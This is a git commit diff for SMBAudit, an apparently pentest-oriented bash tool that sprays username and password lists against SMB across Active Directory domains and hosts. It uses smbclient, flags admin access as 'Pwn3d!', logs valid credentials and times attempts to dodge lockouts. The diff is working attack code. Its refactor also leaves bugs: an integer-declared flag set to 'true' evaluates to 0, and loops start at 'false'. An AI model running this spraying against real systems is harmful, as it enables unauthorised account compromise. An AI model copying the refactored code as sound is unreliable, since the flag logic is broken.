2a5a3352b3e400ccaf91ff452f768098039d1714
unknown <alexandre.teyar@gmail.com>
2019-06-06 12:33:14 +0100

    Update

--- README.md
+++ README.md
@@ -1,8 +1,12 @@
 <p align="center">
     <h1 align="center"> SMBAudit </h1>
-    <p align="center" align="center">
-        <a href="https://www.gnu.org/software/bash/"><img alt="language" src="https://img.shields.io/badge/Lang-Bash%204.2+-blue.svg"></a>
-        <a href="https://opensource.org/licenses/Apache-2.0"><img alt="license" src="https://img.shields.io/badge/License-Apache%202.0-red.svg"></a>
+    <p align="center">
+        <a href="https://www.gnu.org/software/bash/">
+            <img alt="language" src="https://img.shields.io/badge/Lang-Bash%204.2+-blue.svg">
+        </a>
+        <a href="https://opensource.org/licenses/Apache-2.0">
+            <img alt="license" src="https://img.shields.io/badge/License-Apache%202.0-red.svg">
+        </a>
         <img alt="version" src="https://img.shields.io/badge/Version-0.1-green.svg">
         <img alt="bitcoin" src="https://img.shields.io/badge/Bitcoin-15aFaQaW9cxa4tRocax349JJ7RKyj7YV1p-yellow.svg">
         <img alt="bitcoin cash" src="https://img.shields.io/badge/Bitcoin%20Cash-qqez5ed5wjpwq9znyuhd2hdg86nquqpjcgkm3t8mg3-yellow.svg">
@@ -10,21 +14,44 @@
     </p>
 </p>
 
-SMBAudit allows users to perform various SMB-related attacks across multiple Active Directory (AD) domains or hosts. At the moment SMBAudit only supports the features listed under the Features section.
+SMBAudit allows users to perform various SMB-related attacks across multiple Active Directory (AD) domains or hosts. At the moment, SMBAudit only supports the features listed under the [Features](#Features) section.
 
-SMBAudit is fully written in bash (require bash version 4.0+) for increased compatibility with different UNIX distributions and only relies on the following dependancies (packages):
+SMBAudit is fully written in bash (requires bash version 4.0+) for increased compatibility with different UNIX distributions and only relies on the following dependencies (packages):
 * [coreutils](http://www.gnu.org/software/coreutils/coreutils.html)
 * [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
 
 *Note: These packages are almost always pre-installed on all UNIX systems).*
 
-There are already multiple tools which offer similar features than SMBAudit available, for example:
+There are already multiple available tools with features similar to SMBAudit, for example:
 * [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
 * [SMBMap](https://github.com/ShawnDEvans/smbmap)
 
-So why the need for another tool to attack the so-famous SMB protocol? 
+So, is there a real need for yet another tool focusing on attacking the so-famous SMB protocol? 
 
-When performing test from a Unix box with no access to the Internet, it can be a very tedious and time-consuming task to properly install different packages/tools along with their dependancies and most of the tools available do not even implement features that I judge essential for my engagaments. For instance:
-* [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec): Requires Python to be installed on the host system. The documentation even recommends to run it in a Python virtual environment to not 'mess-up' with the host system. Furthermore, CrackMapExec relies on numerous third-party dependancies such as Impacket. Without Internet access and the help of the `pip` utility, the installation process of CrackMapExec is not very straight-forward (according to my own personal experience).
+When performing test from a Unix box with no access to the Internet, it can be a very tedious and time-consuming task to properly install different packages/tools along with their dependencies and most of the tools available do not even implement features that I judge essential for my engagements. For instance:
+* [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec): Requires Python to be installed on the host system. The documentation even recommends running it in a Python virtual environment to not 'mess-up' with the host system. Furthermore, CrackMapExec relies on numerous third-party dependencies such as Impacket. Without Internet access and the help of the `pip` utility, the installation process of CrackMapExec is not very straight-forward (according to my own personal experience).
 
-For the aforementioned reasons, I developped SMBAudit a plug and play tool, compatible with a wide range of Unix-based system and focusing on the SMB protocol only.
+For the aforementioned reasons, I developed SMBAudit a plug and play tool, compatible with a wide range of Unix-based system and focusing on the SMB protocol only.
+
+## Features
+TODO
+
+## One-time donation
+* Donate via Bitcoin      : **15aFaQaW9cxa4tRocax349JJ7RKyj7YV1p**
+* Donate via Bitcoin Cash : **qqez5ed5wjpwq9znyuhd2hdg86nquqpjcgkm3t8mg3**
+* Donate via Ether        : **0x70bC178EC44500C17B554E62BC31EA2B6251f64B**
+
+## License
+   Copyright (C) 2018 Alexandre Teyar
+
+Licensed under the Apache License, Version 2.0 (the "License");
+you may not use this file except in compliance with the License.
+You may obtain a copy of the License at
+
+<http://www.apache.org/licenses/LICENSE-2.0>
+
+Unless required by applicable law or agreed to in writing, software
+distributed under the License is distributed on an "AS IS" BASIS,
+WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+See the License for the specific language governing permissions and
+   limitations under the License.
--- smbaudit.sh
+++ smbaudit.sh
@@ -15,34 +15,47 @@
 #    limitations under the License.
 
 # TODO:
-# * Check the OS before checking for dependancies
-# * Add support for IP addresses/ranges
+# * Add support for IP address/range targets
 # * Implement mutual exclusive options for the argpasrser
-# * Usage menu to finish
 # * Implement share spidering
+# * Usage menu to do
 
 # enable stricter programming rules (turns some bugs into errors)
 # set -Eeuo pipefail
 
-declare -r  PROGNAME=$(basename $0)
-declare -r  PROGBASENAME=${PROGNAME%%.*}
-declare -r  PROGVERSION='0.1'
+declare -gr  PROGNAME=$(basename $0)
+declare -gr  PROGBASENAME=${PROGNAME%%.*}
+declare -gr  PROGDIR=$(dirname ${BASH_SOURCE[0]})
+declare -gr  PROGVERSION=0.6dev
+declare -gr  GIT_BRANCH='dev'
+declare -gar REQUIRED_PACKAGES=( # to comment when experiencing any issue with the dependencies
+    'coreutils'
+    'smbclient'
+)
 
-declare -ar REQUIRED_PACKAGES=('coreutils' 'smbclient') # if experiencing any issue at all with the dependencies, comment this out
-declare -a  RPCCLIENT_OPTIONS=('--signing=on')
-declare -r  DATE_FORMAT='+%d/%m/%Y-%H:%M:%S'
+declare -ga RPCCLIENT_OPTIONS=('--signing=on')
+declare -gr DATE_FORMAT='+%d/%m/%Y-%H:%M:%S'
 
-declare -r  CREDS_SEPARATOR=':'
-declare -i  CFLAG=0
+declare -gr CREDS_SEPARATOR=':'
+declare -gi CFLAG=false
 
-declare -a  DOMAINS
-declare -a  HOSTS
-declare -i  LOCKOUT_DURATION=1800 # 30 mins
-declare -i  LOCKOUT_THRESHOLD=3
-declare     OUT_FOLDER=$PROGBASENAME
-declare -a  PASSWORDS
-declare -a  USERS
-declare -i  VERBOSE=0
+declare -ga DOMAINS
+declare -ga HOSTS
+declare -gi LOCKOUT_DURATION=1800 # 30 mins
+declare -gi LOCKOUT_THRESHOLD=3
+declare -g  OUT_FOLDER="${PROGDIR}/logs"
+declare -ga PASSWORDS
+declare -ga USERS
+declare -gi VERBOSE=0
+
+function print()        { printf "%s » %s\n" "${PROGBASENAME}" "${@}"; }
+function printAttempt() { printf "%s » %-48.48s %-48.48s %s\n" "${PROGBASENAME}" "$1" "$2" "$3"; }
+function printDate()    { printf "%s > %s » %s\n" "${PROGBASENAME}" "$(date "$DATE_FORMAT")" "${@}"; }
+function printError()   { printf "%s > error » %s\n" "${PROGBASENAME}" "${@}"; }
+function printLockout() { 
+    printf "%s > %s » The attack has been paused for %s seconds (approx. %s minutes) to prevent accounts from \
+being locked out...\n" "${PROGBASENAME}" "$(date "$DATE_FORMAT")" "$LOCKOUT_DURATION" "$(($LOCKOUT_DURATION / 60))"
+}
 
 trap quit INT
 
@@ -51,20 +64,7 @@ function quit() {
     exit 130
 }
 
-function print()         { printf "%s » %s\n" "${PROGBASENAME}" "${@}"; }
-
-function print_attempt() { printf "%s » %-48.48s %-48.48s %s\n" "${PROGBASENAME}" "$1" "$2" "$3"; }
-
-function print_date()    { printf "%s > %s » %s\n" "${PROGBASENAME}" "$(date "$DATE_FORMAT")" "${@}"; }
-
-function print_error()   { printf "%s > error » %s\n" "${PROGBASENAME}" "${@}"; }
-
-function print_lockout() { 
-    printf "%s > %s » The attack has been paused for %s seconds (approx. %s minutes) to prevent accounts from \
-being locked out...\n" "${PROGBASENAME}" "$(date "$DATE_FORMAT")" "$LOCKOUT_DURATION" "$(($LOCKOUT_DURATION / 60))"
-}
-
-function write_locked_log()  {
+function writeLocked()  {
     if ! [[ -f "${OUT_FOLDER}/locked.log" ]]
     then
         mkdir -p "${OUT_FOLDER}/" && touch "${OUT_FOLDER}/locked.log"
@@ -73,7 +73,7 @@ function write_locked_log()  {
     printf "%s %s\n" "$(date "$DATE_FORMAT")" "${@}" >> "${OUT_FOLDER}/locked.log"
 }
 
-function write_results_log() { 
+function writeResult() { 
     if ! [[ -f "${OUT_FOLDER}/$2" ]]
     then
         mkdir -p "${OUT_FOLDER}/" && touch "${OUT_FOLDER}/$2.log"
@@ -82,12 +82,12 @@ function write_results_log() {
     printf "%s %s\n" "$(date "$DATE_FORMAT")" "$1" >> "${OUT_FOLDER}/${2}.log"
 }
 
-function parse_args() {
-    local -i dflag=0
-    local -i hflag=0
-    local -i pflag=0
-    local -i uflag=0
-    local -i var=0
+function parseArgs() {
+    local dflag=false # boolean domain
+    local hflag=false # boolean host
+    local pflag=false # boolean password
+    local uflag=false # boolean user
+    local eflag=false # boolean exit
 
     while (($# > 0))
     do
@@ -107,9 +107,9 @@ function parse_args() {
                 exit 0
                 ;;
             --creds)
-                pflag=1
-                uflag=1
-                CFLAG=1
+                pflag=true
+                uflag=true
+                CFLAG=true
                 OPTARG=$(realpath $2)
 
                 if [[ -f $OPTARG ]]
@@ -118,32 +118,32 @@ function parse_args() {
                     ptemp=$(mktemp XXXXXXXXXXXXXXXX)
                     awk -F "$CREDS_SEPARATOR" '{ print $1 }' $OPTARG > $utemp
                     awk -F "$CREDS_SEPARATOR" '{ print $2 }' $OPTARG > $ptemp
-                    load_array $utemp USERS
-                    load_array $ptemp PASSWORDS
+                    loadArray $utemp USERS
+                    loadArray $ptemp PASSWORDS
                     rm -f $utemp $ptemp
                 else
-                    print_error "$OPTARG is not a valid file"
+                    printError "$OPTARG is not a valid file"
                     exit 1
                 fi
                 ;;
             -d)
-                dflag=1
+                dflag=true
                 DOMAINS=($2)
                 ;;
             -D)
-                dflag=1
-                load_array $2 DOMAINS
+                dflag=true
+                loadArray $2 DOMAINS
                 ;;
             -h)
-                hflag=1
+                hflag=true
                 HOSTS=($2)
                 ;;
             -H)
-                hflag=1
-                load_array $2 HOSTS
+                hflag=true
+                loadArray $2 HOSTS
                 ;;
             -la) # local authentication
-                dflag=1
+                dflag=true
                 DOMAINS=('WORKGROUP')
                 ;;
             -ld)
@@ -159,20 +159,20 @@ function parse_args() {
                 RPCCLIENT_OPTIONS+=('--pw-nt-hash')
                 ;;
             -p)
-                pflag=1
+                pflag=true
                 PASSWORDS=($2)
                 ;;
             -P)
-                pflag=1
-                load_array $2 PASSWORDS
+                pflag=true
+                loadArray $2 PASSWORDS
                 ;;        
             -u)
-                uflag=1
+                uflag=true
                 USERS=($2)
                 ;;
             -U)
-                uflag=1
-                load_array $2 USERS
+                uflag=true
+                loadArray $2 USERS
                 ;;       
             -*)
                 printf "%s: illegal option -- %s\n" "$PROGNAME" "$OPT"
@@ -183,13 +183,13 @@ function parse_args() {
         shift      
     done
 
-    if [[ $dflag = 0 || $hflag = 0 || $pflag = 0 || $uflag = 0 ]]
+    if [[ $dflag = false || $hflag = false || $pflag = false || $uflag = false ]]
     then
-        var=1
+        eflag=true
         printf "%s: missing mandatory option(s)\n" "${PROGNAME}"
     fi
 
-    if [[ $var = 1 ]]
+    if [[ $eflag = true ]]
     then
         printf "%s: type '%s --help' for more information\n" "${PROGNAME}" "${PROGNAME}"
         exit 1
@@ -245,14 +245,14 @@ BANNER
     fi
 }
 
-function check_requirements() {
-    local -i var=0
+function checkRequirements() {
+    local eflag=false
     
     print 'Bash version check...'
     if ((BASH_VERSINFO[0] < 4))
     then 
-        var=1
-        print_error "A minimum of bash version 4.0 is required. Upgrade your version with: sudo apt-get install --only-upgrade bash"
+        eflag=true
+        printError "A minimum of bash version 4.0 is required. Upgrade your version with: sudo apt-get install --only-upgrade bash"
     else
         print 'The bash minimum version requirement is satisfied'
     fi
@@ -264,12 +264,12 @@ function check_requirements() {
         then
             continue
         else
-            var=1
-            print_error "The $package package is missing. Install it with: sudo apt-get install $package -y"
+            eflag=true
+            printError "The $package package is missing. Install it with: sudo apt-get install $package -y"
         fi
     done
 
-    if [[ $var = 1 ]]
+    if [[ $eflag = true ]]
     then
         exit 1
     fi
@@ -277,7 +277,7 @@ function check_requirements() {
     print 'All of the required packages are already installed'
 }
 
-function load_array() {
+function loadArray() {
     local -n _vars=$2 # referenced copy of the array passed to the function
     local -a vars
 
@@ -293,46 +293,50 @@ function load_array() {
     then
         readarray -t _vars < $(realpath $1)
     else
-        print_error "$1 is not a valid directory or file"
+        printError "$1 is not a valid directory or file"
         exit 1
     fi
 }
 
+# improve output process
 function spray() {
     local -i counter=0
-    local -i isAdmin=0
+    local    isAdmin=false  # boolean for admin creds
+    local    vflag=false    # boolean verbose
+    
     local    output
-    local    password
-    local    username
     local    var
     local    var1
     local    var2
-    local -i vflag=0 # enable verbose for the successful and lockout attempts (works even when verbose is disabled)
-    local -a _PASSWORDS
-    local -a _USERS  # create a local copy of USERS
+    
+    local    password
+    local    username
 
-    _PASSWORDS=(${PASSWORDS[@]}) # reindex the array to remove any blank/empty entries
+    local -a _PASSWORDS     # local copy of PASSWORDS
+    local -a _USERS         # local copy of USERS
+
+    _PASSWORDS=(${PASSWORDS[@]})    # remove blank/empty entries
 
     for domain in ${DOMAINS[@]}
     do
         for host in ${HOSTS[@]}
         do
-            _USERS=(${USERS[@]}) # reindex the array to remove any blank/empty entries and entries removed in previous iterations
+            _USERS=(${USERS[@]})    # remove blank/empty/found entries
 
-            for ((i=0; i <= ((${#_PASSWORDS[@]} - 1)); i++))
+            for ((i=false; i <= ((${#_PASSWORDS[@]} - 1)); i++))
             do 
                 password=${_PASSWORDS[i]}
                 ((counter++))
 
-                for ((j=0; j <= ((${#_USERS[@]} - 1)); j++))
+                for ((j=false; j <= ((${#_USERS[@]} - 1)); j++))
                 do 
-                    if [[ $CFLAG = 1 ]]
+                    if [[ $CFLAG = true ]]
                     then
                         j=$i
                     fi
 
                     user=${_USERS[j]}
-                    isAdmin=0
+                    isAdmin=false
                     var="${host}:139:"
                     var1="${domain}\\${user}:${password}"
 
@@ -345,8 +349,8 @@ function spray() {
 
                         if [[ $ERROR = 'NT_STATUS_ACCOUNT_LOCKED_OUT' ]]
                         then
-                            write_locked_log "${domain}\\${user}"
-                            vflag=1
+                            writeLocked "${domain}\\${user}"
+                            vflag=true
                         fi
                     else
                         var2=' -> LOGON SUCCESS '
@@ -356,28 +360,28 @@ function spray() {
                         if [[ $res =~ 'netname' ]]
                         then
                             var2+='(Pwn3d!)'
-                            isAdmin=1
+                            isAdmin=true
                         fi
 
-                        write_results_log "${domain}\\${user}:${password} $isAdmin" "$host"
+                        writeResult "${domain}\\${user}:${password} $isAdmin" "$host"
 
                         # delete the current user entry and reindex the _USERS list
-                        if [[ $CFLAG = 0 ]]
+                        if [[ $CFLAG = false ]]
                         then
                             unset _USERS[j]
                             _USERS=(${_USERS[@]})
                         fi
 
-                        vflag=1
+                        vflag=true
                     fi
 
-                    if [[ $VERBOSE > 0 || $vflag = 1 ]]
+                    if [[ $VERBOSE > 0 || $vflag = true ]]
                     then
-                        print_attempt "$var" "$var1" "$var2"
-                        vflag=0
+                        printAttempt "$var" "$var1" "$var2"
+                        vflag=false
                     fi
 
-                    if [[ $CFLAG = 1 ]]
+                    if [[ $CFLAG = true ]]
                     then
                         break
                     fi
@@ -392,7 +396,7 @@ function spray() {
                 # avoid account lockout
                 if ! (( $counter % $LOCKOUT_THRESHOLD ))
                 then
-                    print_lockout
+                    printLockout
                     sleep $LOCKOUT_DURATION
                 fi
             done
@@ -402,16 +406,16 @@ function spray() {
 
 function main() {
     STARTTIME=$(date '+%s')
-    print_date "Starting password spraying attack..."
+    printDate "Starting password spraying attack..."
 
     spray
 
     ENDTIME=$(date '+%s')
     ELAPSED=$(($ENDTIME - $STARTTIME))
-    print_date "It took $(($ELAPSED / 60)) minutes to completed"
+    printDate "It took $(($ELAPSED / 60)) minutes to completed"
 }
 
-parse_args $@
+parseArgs "$@"
 banner
-check_requirements
+checkRequirements
 main
